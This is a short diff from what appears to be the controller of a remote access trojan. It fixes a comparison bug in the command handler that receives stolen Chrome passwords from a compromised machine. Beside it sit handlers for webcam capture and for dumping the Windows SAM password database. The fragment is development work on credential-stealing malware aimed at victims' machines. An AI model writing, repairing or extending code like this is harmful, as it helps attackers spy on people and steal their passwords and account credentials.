@@ -584,7 +584,7 @@ def target_communication(target, ip, alis):
             webcam_count += 1
         elif command[:12] == 'get_sam_dump':
             handle_sam_dump(target, command)
-        elif command[:11] = "chrome_pass":
+        elif command[:11] == "chrome_pass":
             result = reliable_recv(target)
             print(result)
         elif command == 'help':
